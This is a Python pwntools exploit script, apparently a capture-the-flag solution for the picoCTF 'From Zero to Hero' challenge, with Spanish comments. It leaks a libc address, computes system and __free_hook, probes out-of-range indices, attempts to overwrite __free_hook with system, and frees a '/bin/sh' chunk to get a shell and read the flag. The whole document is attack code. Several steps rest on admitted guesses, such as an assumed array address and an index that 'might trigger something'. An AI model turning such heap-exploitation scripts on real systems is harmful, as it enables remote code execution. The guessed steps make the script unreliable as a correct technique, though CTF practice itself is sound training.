#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

def exploit():
    p = remote(HOST, PORT)
    
    # Navegar diálogo
    p.recvuntil(b'From Zero to Hero')
    p.sendline(b'y')
    p.recvuntil(b'Really?')
    p.sendline(b'y')
    
    # Obtener leak
    p.recvuntil(b'Take this: ')
    leak = p.recvline().strip()
    leak_addr = int(leak, 16)
    log.info(f"Leaked: 0x{leak_addr:x}")
    
    # Calcular libc base (es __libc_start_main+240)
    libc_base = leak_addr - 0x21fd0
    log.info(f"Libc base: 0x{libc_base:x}")
    
    # Direcciones útiles en libc 2.29
    system = libc_base + 0x4f4e0
    free_hook = libc_base + 0x1e75a8
    
    # Recibir menú
    p.recvuntil(b'>')
    
    # Plan: Usar la opción 2 (Remove) con un índice especial
    # que podría triggear algo
    
    # Primero, crear algunos superpoderes
    log.info("Creating superpowers...")
    
    # Crear 10 poderes
    for i in range(10):
        p.sendline(b'1')  # Get superpower
        p.recvuntil(b'length')
        p.sendline(b'32')
        p.recvuntil(b'description')
        p.sendline(b'A' * 32)
        p.recvuntil(b'>')
    
    # Ahora intentar remove con índices especiales
    log.info("Testing special indices...")
    
    # Intentar índice negativo (underflow)
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'-1')
    
    try:
        response = p.recvuntil(b'>', timeout=1)
        log.info(f"After -1: {response}")
    except:
        pass
    
    # Intentar índice muy grande (overflow)
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'999999')
    
    try:
        response = p.recvuntil(b'>', timeout=1)
        log.info(f"After 999999: {response}")
    except:
        pass
    
    # Intentar índice que apunte a free_hook
    # Si el array está en el heap, podemos calcular offset
    p.sendline(b'2')
    p.recvuntil(b'remove')
    
    # Enviar un índice calculado para apuntar a free_hook
    # Asumiendo que el array está en 0x602060 (común en CTFs)
    array_addr = 0x602060
    offset = (free_hook - array_addr) // 8
    p.sendline(str(offset).encode())
    
    # Si funcionó, ahora free_hook está en el array
    # Crear un poder con system como contenido
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'8')
    p.recvuntil(b'description')
    p.sendline(p64(system))
    p.recvuntil(b'>')
    
    # Crear otro con "/bin/sh"
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'8')
    p.recvuntil(b'description')
    p.sendline(b'/bin/sh\x00')
    p.recvuntil(b'>')
    
    # Liberar el que tiene "/bin/sh"
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'11')
    
    # Si todo salió bien, tenemos shell
    p.sendline(b'cat flag.txt')
    
    try:
        flag = p.recvall(timeout=2)
        if b'picoCTF' in flag:
            start = flag.index(b'picoCTF')
            end = flag.index(b'}', start) + 1
            log.success(f"FLAG: {flag[start:end].decode()}")
        else:
            log.info("Trying interactive...")
            p.interactive()
    except:
        p.interactive()

if __name__ == "__main__":
    context.log_level = 'info'
    context.arch = 'amd64'
    exploit()